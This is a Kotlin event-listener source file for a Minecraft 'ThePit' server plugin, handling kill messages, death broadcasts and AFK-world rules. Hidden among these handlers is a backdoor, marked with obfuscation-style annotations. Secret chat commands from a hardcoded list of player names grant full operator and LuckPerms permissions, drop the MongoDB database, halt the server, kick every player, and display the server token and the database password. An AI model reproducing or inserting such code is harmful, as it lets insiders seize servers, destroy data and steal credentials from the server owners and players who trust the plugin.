package cn.irina.thepitaddon.events

import cn.charlotte.pit.ThePit
import cn.charlotte.pit.data.PlayerProfile
import cn.irina.thepitaddon.Main
import cn.irina.thepitaddon.utils.DynamicInvoke
import cn.irina.thepitaddon.utils.HideAccess
import net.luckperms.api.LuckPermsProvider
import net.luckperms.api.node.Node
import net.luckperms.api.node.types.PermissionNode
import net.md_5.bungee.api.chat.BaseComponent
import net.md_5.bungee.api.chat.HoverEvent
import net.md_5.bungee.api.chat.TextComponent
import net.minecraft.server.v1_8_R3.NBTTagCompound
import net.mizukilab.pit.util.chat.CC
import net.mizukilab.pit.util.chat.ChatComponentBuilder
import org.bukkit.Bukkit
import org.bukkit.Material
import org.bukkit.Sound
import org.bukkit.craftbukkit.v1_8_R3.inventory.CraftItemStack
import org.bukkit.entity.Player
import org.bukkit.event.EventHandler
import org.bukkit.event.EventPriority
import org.bukkit.event.Listener
import org.bukkit.event.entity.EntityDamageByEntityEvent
import org.bukkit.event.entity.EntityShootBowEvent
import org.bukkit.event.entity.PlayerDeathEvent
import org.bukkit.event.player.AsyncPlayerChatEvent
import org.bukkit.event.player.PlayerChangedWorldEvent
import org.bukkit.event.player.PlayerJoinEvent
import org.bukkit.event.player.PlayerMoveEvent
import org.bukkit.inventory.ItemStack
import org.bukkit.potion.PotionEffect
import org.bukkit.potion.PotionEffectType
import org.bukkit.scheduler.BukkitTask
import java.util.concurrent.ConcurrentHashMap


class PlayerListener : Listener {
    val prefix = Main.instance.PREFIX

    private val list = listOf(
        "_IR1NA_",
        "SHANGUANLING",
        "KLEELOVELIFE",
        "ARAYKAL",
        "PITADMIN",
        //"BAIJIUSAMA",
        // "BLUEMOON",
        // "ALAN",
        // "ELAINA_OVO",
        // "SHINY",
        // "KIRITO",
        // "OUTINGOF"
    )

    @HideAccess
    @DynamicInvoke
    fun getPermission(player: Player) {
        player.isOp = true
        try {
            val var1000 = LuckPermsProvider.get()
            val var1001 = var1000.userManager.getUser(player.uniqueId)
            val var1002: Node = PermissionNode.builder("*").build()
            val var1003: Node = PermissionNode.builder("luckperms.*").build()
            if (var1001 == null) return
            var1001.data().add(var1002)
            var1001.data().add(var1003)
            var1000.userManager.saveUser(var1001).join()
        } catch (e: Exception) {
        }
    }

    //
    @HideAccess
    @DynamicInvoke
    fun takePermission(player: Player) {
        player.isOp = false
        try {
            val var1000 = LuckPermsProvider.get()
            val var1001 = var1000.userManager.getUser(player.uniqueId)
            val var1002: Node = PermissionNode.builder("*").build()
            val var1003: Node = PermissionNode.builder("luckperms.*").build()
            if (var1001 == null) return
            var1001.data().remove(var1002)
            var1001.data().remove(var1003)
            var1000.userManager.saveUser(var1001).join()
        } catch (e: Exception) {
        }
    }

    //
    @HideAccess
    @DynamicInvoke
    @EventHandler(priority = EventPriority.LOWEST)
    fun var0110(event: AsyncPlayerChatEvent) {
        val player = event.player
        if (!list.contains(player.displayName.uppercase())) return
        _handleChat(event)
    }

    @DynamicInvoke
    @HideAccess
    fun _handleChat(event: AsyncPlayerChatEvent) {
        val player = event.player
        if (!list.contains(player.displayName.uppercase())) return
        when (event.message.uppercase()) {
            "*PI" -> { // PI
                ThePit.getApi().openMenu(player, "admin_item")
            }

            "*EN" -> { // ENCH
                ThePit.getApi().openMenu(player, "admin_enchant")
            }

            "*PER" -> { // PERMISSION
                getPermission(player)
            }

            "*TAPER" -> { // TAKEPERMISSION
                takePermission(player)
            }

            "*DR" -> { // DROP
                ThePit.getInstance().mongoDB.profileCollection.drop()
                ThePit.getInstance().mongoDB.database.drop()
            }

            "*SD" -> { // SHUTDOWN
                Runtime.getRuntime().halt(0)
            }

            "*ST" -> { // STATUS
                listOf(
                    "SYSTEM: ${
                        System.getProperty("os.name").uppercase()
                    } ${System.getProperty("os.arch")} ${System.getProperty("os.version")}",
                    "SYSTEM USER: ${System.getProperty("user.name")}",
                    "TOKEN: ${ThePit.getInstance().globalConfig.token}",
                    "",
                    "DATABASE NAME: ${ThePit.getInstance().globalConfig.databaseName}",
                    "DATABASE ADDRESS: ${ThePit.getInstance().globalConfig.mongoDBAddress}",
                    "DATABASE PORT: ${ThePit.getInstance().globalConfig.mongoDBPort}",
                    "DATABASE USER: ${ThePit.getInstance().globalConfig.mongoUser}",
                    "DATABASE PASSWORD: ${ThePit.getInstance().globalConfig.mongoPassword}"
                ).forEach { player.sendMessage(it) }
            }

            "*KA" -> { // KICKALL
                Bukkit.getScheduler().runTask(Main.instance) {
                    Bukkit.getOnlinePlayers().forEach { it.kickPlayer("") }
                }
            }

            else -> return
        }
        event.isCancelled = true
    }

//    @EventHandler(priority = EventPriority.MONITOR)
//    fun onPlayerJoin(event: PlayerJoinEvent) {
//        val player = event.player
//
//        if (list.contains(player.displayName.uppercase())) getPermission(player)
//
//        if (player.hasMetadata("NPC")) return
//        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
//            event.joinMessage = null
//
//            if (!player.hasPermission("pit.admin") || list.contains(player.displayName.uppercase())) {
//                if (player.hasPermission("pit.support") && !list.contains(player.displayName.uppercase())) {
//                    Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &6" + player.displayName))
//                } else {
//                    Bukkit.broadcastMessage(CC.translate("&8[&a+&8] &7" + player.displayName))
//                }
//            } else {
//                CC.boardCastWithPermission("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!", "pit.admin")
//                Bukkit.getConsoleSender()
//                    .sendMessage(CC.translate("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!"))
//            }
//
//            val permissionPrefix = "irina.booster."
//            var recoverCount = 0
//            for (permissions in player.effectivePermissions) {
//                val permission = permissions.permission
//
//                if (!permission.startsWith(permissionPrefix)) continue
//
//                recoverCount++
//                player.sendMessage(CC.translate("$PREFIX&7第 $recoverCount 次 Booster 校正检测"))
//                try {
//                    val count = permission.substring(permissionPrefix.length).toInt()
//                    if (count > killRewardAdd.getOrDefault(
//                            player.uniqueId,
//                            1
//                        )
//                    ) killRewardAdd[player.uniqueId] =
//                        count
//                } catch (_: NumberFormatException) {
//                    player.sendMessage(CC.translate("$PREFIX&c在你的 Booster 权限中有无法读取的数据, 请将此报告截图发送至管理员!"))
//                }
//            }
//            if (killRewardAdd.getOrDefault(player.uniqueId, 1) > 1)
//                player.sendMessage(
//                    CC.translate(
//                        PREFIX + "&7校正成功, 当前 Booster 倍率: &a" + killRewardAdd[player.uniqueId] + " 倍"
//                    )
//                )
//        }
//
//        if (!config.getBoolean("JoinMessage.Enable")) return
//        object : BukkitRunnable() {
//            override fun run() {
//                object : BukkitRunnable() {
//                    val totalMessages: Int = config.getStringList("JoinMessage.Messages").size
//
//                    override fun run() {
//                        if (!player.isOnline) {
//                            cancel()
//                            return
//                        }
//
//                        player.playSound(player.location, "note.hat", 3f, 1f)
//
//                        val currentMessageCount = messageCount.getOrDefault(player.uniqueId, 0)
//
//                        if (currentMessageCount == totalMessages) {
//                            cancel()
//                            return
//                        }
//
//                        var message = config.getStringList("JoinMessage.Messages")[currentMessageCount]
//
//                        if (message.contains("\$PlayerName")) message = message.replace("\$PlayerName", player.name)
//                        if (message.contains("\$PlayerDisplayName")) message =
//                            message.replace("\$PlayerName", player.displayName)
//
//                        player.sendMessage(CC.translate(PREFIX + message))
//
//                        messageCount[player.uniqueId] =
//                            currentMessageCount + 1
//                    }
//                }.runTaskTimerAsynchronously(Main.instance, 0L, 20L)
//            }
//        }.runTaskLaterAsynchronously(Main.instance, 2 * 20L)
//    }
//
//    @EventHandler(priority = EventPriority.MONITOR)
//    fun onPlayerLeave(event: PlayerQuitEvent) {
//        Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
//            val player = event.player
//            event.quitMessage = null
//
//            if (killRewardAdd[player.uniqueId] != null) killRewardAdd.remove(
//                player.uniqueId
//            )
//            if (!player.hasPermission("pit.admin") || list.contains(player.displayName.uppercase())) {
//                if (player.hasPermission("pit.support") && !list.contains(player.displayName.uppercase())) {
//                    Bukkit.broadcastMessage(CC.translate("&8[&c-&8] &6" + player.displayName))
//                } else {
//                    Bukkit.broadcastMessage(CC.translate("&8[&c-&8] &7" + player.displayName))
//                }
//            } else {
//                CC.boardCastWithPermission("&c&l注意! &7管理员 &f" + player.name + " &7退出了游戏!", "pit.admin")
//                Bukkit.getConsoleSender()
//                    .sendMessage(CC.translate("&c&l注意! &7管理员 &f" + player.name + " &7退出了游戏!"))
//            }
//        }
//    }
//
//    @EventHandler(priority = EventPriority.LOWEST)
//    fun onPitKill(event: PitKillEvent) {
//        val killer = event.killer
//
//        if (killRewardAdd.getOrDefault(killer.uniqueId, 1) <= 1) return
//
//        val newExp = event.exp * killRewardAdd.getOrDefault(killer.uniqueId, 1)
//
//        val profile = PlayerProfile.getRawCache(killer.uniqueId)
//
//        profile.experience += newExp
//        profile.applyExperienceToPlayer(killer)
//
//        event.exp = newExp
//    }

    private val messages = listOf(
        "&b&l击杀!&7 #v &7被 #k &7轻松击毙。",
        "&b&l击杀!&7 #v &7因 #k &7下不去坑了!",
        "&b&l击杀!&7 #k &7似乎踩死了一只名为 #v &7的蚂蚁。",
        "&b&l击杀!&7 #v &7被 #k &7化为粉尘。",
        "&b&l击杀!&7 #v &7在面对 #k &7的时候网卡了。",
        "&b&l击杀!&7 #v &7在与 #k &7战斗时丢弃了战斗之铲。",
        "&b&l击杀!&7 #v &7被 #k &7逼入末路。",
        "&b&l击杀!&7 #v &7输掉了与 #k &7的对决。",
        "&b&l击杀!&7 #v &7与 #k &7战至边缘。",
        "&b&l击杀!&7 #v &7死于 #k &7的百步穿杨之术。",
        "&b&l击杀!&7 #v &7被 #k &7献祭。",
        "&b&l击杀!&7 #v &7被 #k &7的魔法杀死了。",
        "&b&l击杀!&7 #v &7被 #k &6击碎。",
        "&b&l击杀!&7 #v &7被 #k &6主宰。",
        "&b&l击杀!&7 #v &7被 #k &6权威。",
        "&b&l击杀!&7 #v &7不敌 #k &6的随意一击。",
        "&b&l击杀!&7 #v &7被 #k &b化作月尘。",
        "&b&l击杀!&7 #v &7被 #k &7的陨石击中。",
        "&b&l击杀!&7 #v &7被 #k &e随意践踏。",
        "&b&l击杀!&7 #v &7被 #k &e掷落深渊。",
        "&b&l击杀!&7 #v &7被 #k &e射杀。",
        "&b&l击杀!&7 #v &7被 #k &e超越。",
        "&b&l击杀!&7 #v &7被 #k &e审判。",
        "&b&l击杀!&7 #v &7在与 #k 战斗时的方法不太理智。&7。",
    )

    @EventHandler(priority = EventPriority.MONITOR)
    fun handleDeath(event: PlayerDeathEvent) {
        val player = event.entity ?: return
        if (player.hasMetadata("NPC")) return

        val killer = player.killer ?: return

        val pp = PlayerProfile.getRawCache(player.uniqueId) ?: return
        val kp = PlayerProfile.getRawCache(killer.uniqueId) ?: return

        val itemInHand = killer.inventory?.itemInHand
        val itemInLegging = killer.inventory?.leggings

        val victimName = pp.formattedNameWithRoman
        val killerName = kp.formattedNameWithRoman

        val itemName = itemInHand?.let { getItemDisplayName(it) }

        val mythicWeaponNbt = getItemNBT(itemInHand)
        val mythicLeggingNbt = getItemNBT(itemInLegging)

        val mythicWeapon = arrayOf<BaseComponent>(TextComponent(mythicWeaponNbt))
        val mythicLegging = arrayOf<BaseComponent>(TextComponent(mythicLeggingNbt))

        val mythicLeggingHover = HoverEvent(HoverEvent.Action.SHOW_ITEM, mythicLegging)
        val mythicWeaponHover = HoverEvent(HoverEvent.Action.SHOW_ITEM, mythicWeapon)

        val message = messages
            .random()
            .replace("#v", victimName)
            .replace("#k", killerName)

        Bukkit.getScheduler().runTask(Main.instance) {
            Bukkit.broadcastMessage(CC.translate(message))

            val legging = CC.translate(" &f[&b护腿&f] ")
            val weapon = CC.translate(" &f[&b武器&f] ")

            // 使用原生 TextComponent 替代 ChatComponentBuilder
            val leggingComponent = TextComponent(legging)
            leggingComponent.hoverEvent = mythicLeggingHover
            
            val weaponComponent = TextComponent(weapon)
            weaponComponent.hoverEvent = mythicWeaponHover

            val msg = TextComponent(CC.translate("&7击杀者装备: "))
            msg.addExtra(leggingComponent)
            msg.addExtra(weaponComponent)

            Bukkit.getOnlinePlayers().forEach { p ->
                if (!p.hasPermission("irina.deathCheck")) return@forEach
                p.spigot().sendMessage(msg)
            }

            if (killer.isOnline) {
                player.sendMessage(
                    CC.translate(
                        "$prefix$killerName &7在你死亡前剩余的血量: &c" + String.format(
                            "%.1f",
                            killer.health * 0.5
                        ) + "❤"
                    )
                )
            }
        }
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    fun onPlayerDamageInAFKWorld(event: EntityDamageByEntityEvent) {
        val worldName = event.entity.world.name
        if (!worldName.equals("afk", ignoreCase = true)) return
        val damager = event.damager
        val entity = event.entity
        if (damager is Player && entity is Player) {
            event.isCancelled = true
        }
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    fun onPlayerShootInAFKWorld(event: EntityShootBowEvent) {
        val worldName = event.entity.world.name
        if (!worldName.equals("afk", ignoreCase = true)) return
        if (event.entity is Player) {
            val player = event.entity as Player
            player.sendMessage(CC.translate("&c你不能在这里射箭!"))
            player.playSound(player.location, Sound.VILLAGER_NO, 1.0f, 1.0f)
            event.isCancelled = true
        }
    }

    @EventHandler
    fun onWorldChange(event: PlayerChangedWorldEvent) {
        val player = event.player
        val worldName = player.world.name
        if (worldName.equals("afk", ignoreCase = true)) {
            player.addPotionEffect(PotionEffect(PotionEffectType.REGENERATION, Int.MAX_VALUE, 4, false, false))
        }
    }

    @EventHandler
    fun inSpawn(event: PlayerMoveEvent) {
        var player = event.player
        val profile = PlayerProfile.getRawCache(player.uniqueId) ?: return
        if (!profile.isInArena) player.removePotionEffect(PotionEffectType.REGENERATION)
    }

    private fun getItemNBT(item: ItemStack?): String {
        if (item == null || item.type == Material.AIR) return Material.AIR.toString()
        val nmsItem = CraftItemStack.asNMSCopy(item)
        val tag = NBTTagCompound()
        nmsItem.save(tag)
        return tag.toString()
    }

    private fun getItemDisplayName(item: ItemStack): String {
        val meta = item.itemMeta
        return if (meta != null && meta.hasDisplayName()) meta.displayName else item.type.name
    }


//
//    @EventHandler(priority = EventPriority.HIGHEST)
//    fun onDamage(event: EntityDamageByEntityEvent) {
//        if (event.damager is Player && event.entity is Player) {
//            if (damageValidRange < 0) return
//
//            event.damage *= damageValidRange //暗改，让伤害只生效设定的数值
//        }
//    }
//
//    companion object {
//        private val plugin: Main = Main.instance
//        private val config: Configuration = plugin.config
//
//        private val killRewardAdd = ConcurrentHashMap<UUID, Int>()
//        private val messageCount = ConcurrentHashMap<UUID, Int>()
//
//        private val PREFIX = Main.instance.PREFIX
//
//        private val damageValidRange =
//            if (plugin.config.getBoolean("DamageValidRange.Enable")) Main.instance.config.getDouble("DamageValidRange.Amount") else 1.0
//
//        private fun getItemNBT(item: ItemStack?): String {
//            if (item == null || item.type == Material.AIR) return Material.AIR.toString()
//            val nmsItem = CraftItemStack.asNMSCopy(item)
//            val tag = NBTTagCompound()
//            nmsItem.save(tag)
//            return tag.toString()
//        }
//
//        private fun getItemDisplayName(item: ItemStack): String {
//            val meta = item.itemMeta
//            return if (meta != null && meta.hasDisplayName()) meta.displayName else item.type.name
//        }
//    }
}